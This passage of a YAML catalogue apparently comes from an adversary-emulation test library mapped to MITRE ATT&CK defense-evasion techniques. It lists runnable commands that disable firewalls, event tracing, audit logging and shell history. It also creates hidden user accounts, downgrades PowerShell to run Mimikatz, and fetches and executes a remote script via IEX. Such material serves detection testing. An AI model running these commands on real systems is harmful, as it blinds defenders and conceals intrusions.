        Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-TaskScheduler/Operational -Name "ChannelAccess" -Value "O:SYG:SYD:(D;;0x1;;;WD)"
        Restart-Service -Name EventLog -Force -ErrorAction Ignore
      cleanup: |-
        Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-TaskScheduler/Operational -Name "ChannelAccess" -Value "O:BAG:SYD:(A;;0x2;;;S-1-15-2-1)(A;;0x2;;;S-1-15-3-1024-3153509613-960666767-3724611135-2725662640-12138253-543910227-1950414635-4190290187)(A;;0xf0007;;;SY)(A;;0x7;;;BA)(A;;0x7;;;SO)(A;;0x3;;;IU)(A;;0x3;;;SU)(A;;0x3;;;S-1-5-3)(A;;0x3;;;S-1-5-33)(A;;0x1;;;S-1-5-32-573)"
        Restart-Service -Name EventLog -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Modify Event Log Channel Access Permissions via Registry 2 - PowerShell
      type: powershell
      platform: windows
      command: |-
        New-Item -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\Setup -Force
        Set-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\Setup -Name "ChannelAccess" -Value "O:SYG:SYD:(D;;0x1;;;WD)"
        Restart-Service -Name EventLog -Force -ErrorAction Ignore
      cleanup: |-
        Remove-Item -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\EventLog\Setup -Force
        Restart-Service -Name EventLog -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Modify Event Log Access Permissions via Registry - PowerShell
      type: powershell
      platform: windows
      command: Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\System -Name "CustomSD" -Value "O:SYG:SYD:(D;;0x1;;;WD)"
      cleanup: Remove-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\EventLog\System -Name "CustomSD"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1562/002
  is_safe: false
- id: T1562.003
  name: Impair Command History Logging
  description: "Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. \n\nOn Linux and macOS, command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The <code>HISTCO..."
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Disable history collection
      type: sh
      platform: linux
      command: |-
        export HISTCONTROL=ignoreboth
        whoami
      timeout: 60
    - name: Disable history collection
      type: sh
      platform: macos
      command: |-
        export HISTCONTROL=ignoreboth
        whoami
      timeout: 60
    - name: Disable history collection (freebsd)
      type: sh
      platform: linux
      command: |-
        export HISTSIZE=0
        whoami
      timeout: 60
    - name: Clear bash history
      type: bash
      platform: linux
      command: "cp $HISTFILE $HISTFILE.OLD\nif ((${#HISTFILE[@]})); then echo $HISTFILE; fi\necho \"\" > $HISTFILE\nif [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \"$HISTFILE is larger than 1k\"; fi\nls -la $HISTFILE \ncat $HISTFILE\nhistory -c \nif [ $(history |wc -l) -eq 1 ]; then echo \"History cache cleared\"; fi"
      cleanup: mv -f $HISTFILE.OLD $HISTFILE
      timeout: 60
    - name: Setting the HISTCONTROL environment variable
      type: bash
      platform: linux
      command: "TEST=$(echo $HISTCONTROL)\nif [ \"$HISTCONTROL\" != \"ignoreboth\" ]; then export HISTCONTROL=\"ignoreboth\"; fi\nhistory -c \nls -la $HISTFILE # \" ls -la $HISTFILE\"\nif [ $(history |wc -l) -eq 1 ]; then echo \"ls -la is not in history cache\"; fi\nif [ \"$HISTCONTROL\" != \"erasedups\" ]; then export HISTCONTROL=\"erasedups\"; fi\nhistory -c \nls -la $HISTFILE\nls -la $HISTFILE\nls -la $HISTFILE\nif [ $(history |wc -l) -eq 2 ]; then echo \"Their is only one entry for ls -la $HISTFILE\"; fi"
      cleanup: export HISTCONTROL=$(echo $TEST)
      timeout: 60
    - name: Setting the HISTFILESIZE environment variable
      type: bash
      platform: linux
      command: |-
        TEST=$(echo $HISTFILESIZE)
        echo $HISTFILESIZE
        export HISTFILESIZE=0
        echo "runnning some commands to populate the history"
        whoami
        groups
        if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo "\$HISTFILESIZE is zero"; else HIST_LENGHT=$(wc -l $HISTFILE); echo "\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT";  fi
      cleanup: export HISTCONTROL=$(echo $TEST)
      timeout: 60
    - name: Setting the HISTSIZE environment variable
      type: sh
      platform: linux
      command: |-
        echo $HISTSIZE
        export HISTSIZE=0
        echo "runnning some commands to populate the history"
        whoami
        groups
        if [ $(echo $HISTSIZE) -eq 0 ]; then echo "\$HISTSIZE is zero"; else HIST_LENGTH=$(wc -l $HISTFILE); echo "\$HISTSIZE is not zero, history size is $HIST_LENGTH";  fi
      cleanup: export HISTSIZE=100
      timeout: 60
    - name: Setting the HISTFILE environment variable
      type: bash
      platform: linux
      command: |-
        TEST=$(echo $HISTFILE)
        echo $HISTFILE
        export HISTFILE="/dev/null"
        echo "runnning some commands to populate the history"
        whoami
        groups
        if [ $(echo $HISTFILE) == "/dev/null" ]; then echo "\$HISTFILE is /dev/null"; else HIST_LENGHT=$(wc -l $HISTFILE); echo "\$HISTFILE is not /dev/null, history lenght is $HIST_LENGHT";  fi
      cleanup: export HISTFILE=$(echo $TEST)
      timeout: 60
    - name: Setting the HISTFILE environment variable (freebsd)
      type: sh
      platform: linux
      command: |-
        echo $HISTFILE
        export HISTFILE="/dev/null"
        if [ $(echo $HISTFILE) == "/dev/null" ]; then echo "\$HISTFILE is /dev/null"; fi
      cleanup: export HISTFILE=~/.sh_history
      timeout: 60
    - name: Setting the HISTIGNORE environment variable
      type: bash
      platform: linux
      command: "if ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='ls*:rm*:ssh*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi\nhistory -c \nls -la $HISTFILE\nls -la ~/.bash_logout\nif [ $(history |wc -l) -eq 1 ]; then echo \"ls commands are not in history\"; fi\nunset HISTIGNORE\nif ((${#HISTIGNORE[@]})); then echo \"\\$HISTIGNORE = $HISTIGNORE\"; else export HISTIGNORE='*'; echo \"\\$HISTIGNORE = $HISTIGNORE\"; fi\nhistory -c \nwhoami\ngroups\nif [ $(history |wc -l) -eq 0 ]; then echo \"History cache is empty\"; fi"
      cleanup: unset HISTIGNORE
      timeout: 60
    - name: Disable Windows Command Line Auditing using reg.exe
      type: cmd
      platform: windows
      command: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 0 /f
      cleanup: reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f
      timeout: 120
      elevation_required: true
    - name: Disable Windows Command Line Auditing using Powershell Cmdlet
      type: powershell
      platform: windows
      command: New-ItemProperty -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 0 -PropertyType DWORD -Force -ErrorAction Ignore
      cleanup: New-ItemProperty -Path "HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" -Name "ProcessCreationIncludeCmdLine_Enabled" -Value 1 -PropertyType DWORD -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1562/003
  is_safe: false
- id: T1562.004
  name: Disable or Modify System Firewall
  description: |-
    Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.

    Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would o...
  tactic: defense-evasion
  platforms:
    - linux
    - macos
    - windows
  executors:
    - name: Disable Microsoft Defender Firewall
      type: cmd
      platform: windows
      command: netsh advfirewall set currentprofile state off
      cleanup: netsh advfirewall set currentprofile state on >nul 2>&1
      timeout: 120
    - name: Disable Microsoft Defender Firewall via Registry
      type: cmd
      platform: windows
      command: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f
      cleanup: reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "EnableFirewall" /t REG_DWORD /d 1 /f
      timeout: 120
    - name: Allow SMB and RDP on Microsoft Defender Firewall
      type: cmd
      platform: windows
      command: |-
        netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
        netsh advfirewall firewall set rule group="file and printer sharing" new enable=Yes
      cleanup: netsh advfirewall reset >nul 2>&1
      timeout: 120
    - name: Opening ports for proxy - HARDRAIN
      type: cmd
      platform: windows
      command: netsh advfirewall firewall add rule name="atomic testing" action=allow dir=in protocol=TCP localport=450
      cleanup: netsh advfirewall firewall delete rule name="atomic testing" protocol=TCP localport=450 >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Open a local port through Windows Firewall to any profile
      type: powershell
      platform: windows
      command: netsh advfirewall firewall add rule name="Open Port to Any" dir=in protocol=tcp localport=3389 action=allow profile=any
      cleanup: netsh advfirewall firewall delete rule name="Open Port to Any" | Out-Null
      timeout: 120
      elevation_required: true
    - name: Allow Executable Through Firewall Located in Non-Standard Location
      type: powershell
      platform: windows
      command: |-
        Copy-Item "PathToAtomicsFolder\T1562.004\bin\AtomicTest.exe" -Destination "C:\Users\$env:UserName" -Force
        netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes
      cleanup: |-
        netsh advfirewall firewall delete rule name="Atomic Test" | Out-Null
        Remove-Item C:\Users\$env:UserName\AtomicTest.exe -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Stop/Start UFW firewall
      type: sh
      platform: linux
      command: ufw disable
      cleanup: |-
        ufw enable
        ufw status verbose
      timeout: 60
      elevation_required: true
    - name: Stop/Start Packet Filter
      type: sh
      platform: linux
      command: |-
        service pf stop
        service pf disable
      cleanup: |-
        service pf enable
        service pf start
        service pf status
      timeout: 60
      elevation_required: true
    - name: Stop/Start UFW firewall systemctl
      type: sh
      platform: linux
      command: systemctl stop ufw
      cleanup: |-
        systemctl start ufw
        systemctl status ufw
      timeout: 60
      elevation_required: true
    - name: Turn off UFW logging
      type: sh
      platform: linux
      command: ufw logging off
      cleanup: |-
        ufw logging low
        ufw status verbose
      timeout: 60
      elevation_required: true
    - name: Add and delete UFW firewall rules
      type: sh
      platform: linux
      command: |-
        ufw prepend deny from 1.2.3.4
        ufw status numbered
      cleanup: |-
        { echo y; echo response; } | ufw delete 1
        ufw status numbered
      timeout: 60
      elevation_required: true
    - name: Add and delete Packet Filter rules
      type: sh
      platform: linux
      command: |-
        echo "block in proto tcp from 1.2.3.4 to any" | pfctl -a pf-rules -f -
        pfctl -a pf-rules -s rules
      cleanup: |-
        pfctl -a pf-rules -F rules
        sed -i "" '/anchor pf-rules/d'
        pfctl -f /etc/pf.conf
      timeout: 60
      elevation_required: true
    - name: Edit UFW firewall user.rules file
      type: sh
      platform: linux
      command: |-
        echo "# THIS IS A COMMENT" >> /etc/ufw/user.rules
        grep "# THIS IS A COMMENT" /etc/ufw/user.rules
      cleanup: sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/user.rules
      timeout: 60
      elevation_required: true
    - name: Edit UFW firewall ufw.conf file
      type: sh
      platform: linux
      command: |-
        echo "# THIS IS A COMMENT" >> /etc/ufw/ufw.conf
        grep "# THIS IS A COMMENT" /etc/ufw/ufw.conf
      cleanup: |-
        sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/ufw.conf
        cat /etc/ufw/ufw.conf
      timeout: 60
      elevation_required: true
    - name: Edit UFW firewall sysctl.conf file
      type: sh
      platform: linux
      command: |-
        echo "# THIS IS A COMMENT" >> /etc/ufw/sysctl.conf
        grep "# THIS IS A COMMENT" /etc/ufw/sysctl.conf
      cleanup: |-
        sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/sysctl.conf
        cat /etc/ufw/sysctl.conf
      timeout: 60
      elevation_required: true
    - name: Edit UFW firewall main configuration file
      type: sh
      platform: linux
      command: |-
        echo "# THIS IS A COMMENT" >> /etc/default/ufw
        grep "# THIS IS A COMMENT" /etc/default/ufw
      cleanup: sed -i 's/# THIS IS A COMMENT//g' /etc/default/ufw
      timeout: 60
      elevation_required: true
    - name: Tail the UFW firewall log file
      type: sh
      platform: linux
      command: tail /var/log/ufw.log
      timeout: 60
      elevation_required: true
    - name: Disable iptables
      type: sh
      platform: linux
      command: |-
        iptables-save > /tmp/iptables.rules
        iptables -F
      cleanup: iptables-restore < /tmp/iptables.rules
      timeout: 60
      elevation_required: true
    - name: Modify/delete iptables firewall rules
      type: sh
      platform: linux
      command: iptables -D OUTPUT -p tcp --dport 21 -j DROP
      cleanup: iptables-restore < /tmp/iptables.rules
      timeout: 60
      elevation_required: true
    - name: LockBit Black - Unusual Windows firewall registry modification -cmd
      type: cmd
      platform: windows
      command: |-
        reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
        reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
      cleanup: |-
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /f >nul 2>&1
        reg delete "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: LockBit Black - Unusual Windows firewall registry modification -Powershell
      type: powershell
      platform: windows
      command: |-
        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
        New-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force
      cleanup: |-
        Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile"  -Name EnableFirewall -Force -ErrorAction Ignore
        Remove-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" -Name EnableFirewall -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Blackbit - Disable Windows Firewall using netsh firewall
      type: cmd
      platform: windows
      command: netsh firewall set opmode mode=disable
      cleanup: netsh firewall set opmode mode=enable >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: ESXi - Disable Firewall via Esxcli
      type: cmd
      platform: windows
      command: PathToAtomicsFolder\..\ExternalPayloads\plink.exe -ssh atomic.local -l root -pw n/a -m PathToAtomicsFolder\..\atomics\T1562.004\src\esxi_disable_firewall.txt
      cleanup: PathToAtomicsFolder\..\ExternalPayloads\plink.exe -ssh atomic.local -l root -pw n/a -m PathToAtomicsFolder\..\atomics\T1562.004\src\esxi_enable_firewall.txt
      timeout: 120
    - name: Set a firewall rule using New-NetFirewallRule
      type: powershell
      platform: windows
      command: New-NetFirewallRule -DisplayName "New rule" -Direction "Inbound" -LocalPort "21" -Protocol "TCP" -Action "allow"
      cleanup: Remove-NetFirewallRule -DisplayName "New rule"
      timeout: 120
      elevation_required: true
    - name: ESXi - Set Firewall to PASS Traffic
      type: cmd
      platform: windows
      command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "esxcli network firewall set --default-action true"
      cleanup: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" -batch "atomic.local" -ssh -l root -pw "password" "esxcli network firewall set --default-action false"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1562/004
  is_safe: false
- id: T1562.006
  name: Indicator Blocking
  description: 'An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting(Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW)(Citation: Microsoft About Event Tracing 2018), by tampering settings that control the collection and flow of event telemetry.(Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in conf...'
  tactic: defense-evasion
  platforms:
    - windows
    - macos
    - linux
  executors:
    - name: Auditing Configuration Changes on Linux Host
      type: bash
      platform: linux
      command: "sed -i '$ a #art_test_1562_006_1' /etc/audisp/audispd.conf\nif [ -f \"/etc/auditd.conf\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/auditd.conf\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/auditd.conf\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/libaudit.conf"
      cleanup: |-
        sed -i '$ d' /etc/audisp/audispd.conf
        if [ -f "/etc/auditd.conf" ];
        then sed -i '$ d' /etc/auditd.conf
        else sed -i '$ d' /etc/audit/auditd.conf
        fi
        sed -i '$ d' /etc/libaudit.conf
      timeout: 60
      elevation_required: true
    - name: Auditing Configuration Changes on FreeBSD Host
      type: sh
      platform: linux
      command: echo '#art_test_1562_006_1' >> /etc/security/audit_event
      cleanup: sed -i "" '/#art_test_1562_006_1/d' /etc/security/audit_event
      timeout: 60
      elevation_required: true
    - name: Logging Configuration Changes on Linux Host
      type: bash
      platform: linux
      command: |-
        if [ -f "/etc/syslog.conf" ];
        then sed -i '$ a #art_test_1562_006_2' /etc/syslog.conf
        fi
        if [ -f "/etc/rsyslog.conf" ];
        then sed -i '$ a #art_test_1562_006_2' /etc/rsyslog.conf
        fi
        if [ -f "/etc/syslog-ng/syslog-ng.conf" ];
        then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/syslog-ng.conf
        fi
      cleanup: |-
        if [ -f "/etc/syslog.conf" ];
        then sed -i '$ d' /etc/syslog.conf
        fi
        if [ -f "/etc/rsyslog.conf" ];
        then sed -i '$ d' /etc/rsyslog.conf
        fi
        if [ -f "/etc/syslog-ng/syslog-ng.conf" ];
        then sed -i '$ d' /etc/syslog-ng/syslog-ng.conf
        fi
      timeout: 60
      elevation_required: true
    - name: Logging Configuration Changes on FreeBSD Host
      type: sh
      platform: linux
      command: |-
        if [ -f "/etc/syslog.conf" ];
        then echo '#art_test_1562_006_2' >> /etc/syslog.conf
        fi
      cleanup: |-
        if [ -f "/etc/syslog.conf" ];
        then sed -i "" '/#art_test_1562_006_2/d' /etc/syslog.conf
        fi
      timeout: 60
      elevation_required: true
    - name: Disable Powershell ETW Provider - Windows
      type: powershell
      platform: windows
      command: cmd /c "PathToAtomicsFolder\..\ExternalPayloads\pstools\PsExec.exe" -accepteula -i -s cmd.exe /c logman update trace "EventLog-Application" --p "Microsoft-Windows-Powershell" -ets
      cleanup: cmd /c "PathToAtomicsFolder\..\ExternalPayloads\pstools\PsExec.exe" -i -s cmd.exe /c logman update trace "EventLog-Application" -p "Microsoft-Windows-Powershell" -ets
      timeout: 120
      elevation_required: true
    - name: Disable .NET Event Tracing for Windows Via Registry (cmd)
      type: cmd
      platform: windows
      command: REG ADD HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /t REG_DWORD /d 0
      cleanup: REG DELETE HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /f > nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Disable .NET Event Tracing for Windows Via Registry (powershell)
      type: powershell
      platform: windows
      command: New-ItemProperty -Path HKLM:\Software\Microsoft\.NETFramework -Name ETWEnabled -Value 0 -PropertyType "DWord" -Force
      cleanup: REG DELETE HKLM\Software\Microsoft\.NETFramework /v ETWEnabled /f > $null 2>&1
      timeout: 120
      elevation_required: true
    - name: LockBit Black - Disable the ETW Provider of Windows Defender -cmd
      type: cmd
      platform: windows
      command: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational" /v Enabled /t REG_DWORD /d 0 /f
      cleanup: reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational" /v Enabled /f >nul 2>&1
      timeout: 120
      elevation_required: true
    - name: LockBit Black - Disable the ETW Provider of Windows Defender -Powershell
      type: powershell
      platform: windows
      command: New-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational" -Name Enabled  -PropertyType DWord -Value 0 -Force
      cleanup: Remove-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational" -Name Enabled -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
    - name: Disable .NET Event Tracing for Windows Via Environment Variable HKCU Registry - Cmd
      type: cmd
      platform: windows
      command: REG ADD HKCU\Environment /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f
      cleanup: REG DELETE HKCU\Environment /v COMPlus_ETWEnabled /f > nul 2>&1
      timeout: 120
    - name: Disable .NET Event Tracing for Windows Via Environment Variable HKCU Registry - PowerShell
      type: powershell
      platform: windows
      command: New-ItemProperty -Path HKCU:\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType "String" -Force
      cleanup: Remove-ItemProperty -Path HKCU:\Environment -Name COMPlus_ETWEnabled
      timeout: 120
    - name: Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - Cmd
      type: cmd
      platform: windows
      command: REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f
      cleanup: REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v COMPlus_ETWEnabled /f > nul 2>&1
      timeout: 120
      elevation_required: true
    - name: Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - PowerShell
      type: powershell
      platform: windows
      command: New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name COMPlus_ETWEnabled -Value 0 -PropertyType "String" -Force
      cleanup: Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" -Name COMPlus_ETWEnabled
      timeout: 120
      elevation_required: true
    - name: Block Cybersecurity communication by leveraging Windows Name Resolution Policy Table
      type: powershell
      platform: windows
      command: |-
        Add-DnsClientNrptRule -Namespace ".endpoint.security.microsoft.com" -NameServers 127.0.0.1 -Comment "Silenced by Name Resolution Policy Table"
        Add-DnsClientNrptRule -Namespace "endpoint.security.microsoft.com" -NameServers 127.0.0.1 -Comment "Silenced by Name Resolution Policy Table"
        Clear-DnsClientCache
      cleanup: "try {\n    # Get all current NRPT rules\n        $DnsClientNrptRules = Get-DnsClientNrptRule | Where-Object { $_.Comment -eq 'Silenced by Name Resolution Policy Table' }\n    \n    # Remove each NRPT rule\n        foreach ($rule in $DnsClientNrptRules) {\n            Remove-DnsClientNrptRule -Name $rule.Name -Force\n        }\n    \n    # Clear DNS client cache\n    Clear-DnsClientCache\n    Write-Host \"All NRPT rules have been removed and the DNS cache has been cleared.\"\n}\n\ncatch {\n    Write-Host \"An error occurred: $_\"\n}\nClear-DnsClientCache"
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1562/006
  is_safe: false
- id: T1562.009
  name: Safe Mode Boot
  description: 'Adversaries may abuse Windows safe mode to disable endpoint defenses. Safe mode starts up the Windows operating system with a limited set of drivers and services. Third-party security software such as endpoint detection and response (EDR) tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot.(Citation: Microsoft Safe Mode)(Citation: Sophos Snatch Rans...'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Safe Mode Boot
      type: cmd
      platform: windows
      command: bcdedit /set safeboot network
      cleanup: bcdedit /deletevalue {current} safeboot
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1562/009
  is_safe: false
- id: T1562.010
  name: Downgrade Attack
  description: "Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a systems backward compatibility to force it into less secure modes of operation. \n\nAdversaries may downgrade and use various less-secure versions of features of a system, such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s or even network protocols that can be abused..."
  tactic: defense-evasion
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI
      type: powershell
      platform: linux
      command: "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server atomic.local -User root -Password pass\n(Get-EsxCli -VMHost atomic.local -V2).software.acceptance.set.Invoke(@{level = \"CommunitySupported\"})\nDisconnect-VIServer -Confirm:$false"
      timeout: 120
      elevation_required: true
    - name: ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI
      type: cmd
      platform: windows
      command: echo "" | "PathToAtomicsFolder\..\ExternalPayloads\plink.exe" "atomic.local" -ssh  -l "root" -pw "pass" -m "PathToAtomicsFolder\T1562.010\src\esx_community_supported.txt"
      timeout: 120
    - name: PowerShell Version 2 Downgrade
      type: powershell
      platform: windows
      command: PowerShell -version 2 -command 'Invoke-Mimikatz'
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1562/010
  is_safe: false
- id: T1562.012
  name: Disable or Modify Linux Audit System
  description: |-
    Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules.

    Often referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by ...
  tactic: defense-evasion
  platforms:
    - linux
  executors:
    - name: Delete all auditd rules using auditctl
      type: sh
      platform: linux
      command: auditctl -D
      cleanup: service auditd restart
      timeout: 60
      elevation_required: true
    - name: Disable auditd using auditctl
      type: sh
      platform: linux
      command: auditctl -e 0
      cleanup: auditctl -e 1
      timeout: 60
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1562/012
  is_safe: false
- id: T1564
  name: Hide Artifacts
  description: 'Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex T...'
  tactic: defense-evasion
  platforms:
    - linux
    - windows
    - macos
  executors:
    - name: Extract binary files via VBA
      type: powershell
      platform: windows
      command: |-
        $macro = [System.IO.File]::ReadAllText("PathToAtomicsFolder\T1564\src\T1564-macrocode.txt")
        $macro = $macro -replace "aREPLACEMEa", "PathToAtomicsFolder\T1564\bin\extractme.bin"
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
        Invoke-Maldoc -macroCode "$macro" -officeProduct "Word" -sub "Extract" -NoWrap
      cleanup: Remove-Item "$env:TEMP\extracted.exe" -ErrorAction Ignore
      timeout: 120
    - name: Create a Hidden User Called "$"
      type: cmd
      platform: windows
      command: net user $ ATOMIC123! /add /active:yes
      cleanup: net user $ /DELETE 2>&1
      timeout: 120
      elevation_required: true
    - name: Create an "Administrator " user (with a space on the end)
      type: powershell
      platform: windows
      command: New-LocalUser -Name "Administrator " -NoPassword
      cleanup: Remove-LocalUser -Name "Administrator " 2>&1 | out-null
      timeout: 120
      elevation_required: true
    - name: Create and Hide a Service with sc.exe
      type: cmd
      platform: windows
      command: |-
        sc.exe create AtomicService binPath= "C:\Windows\System32\calc.exe"
        sc sdset AtomicService "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
      cleanup: |-
        sc sdset AtomicService "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
        sc.exe delete AtomicService
      timeout: 120
      elevation_required: true
    - name: Command Execution with NirCmd
      type: powershell
      platform: windows
      command: cmd /c "PathToAtomicsFolder\..\ExternalPayloads\nircmd.exe" win child class "Shell_TrayWnd" hide class "TrayClockWClass"
      cleanup: cmd /c "PathToAtomicsFolder\..\ExternalPayloads\nircmd.exe" win child class "Shell_TrayWnd" show class "TrayClockWClass" -erroraction silentlycontinue | out-null
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1564
  is_safe: false
- id: T1564.001
  name: Hidden Files and Directories
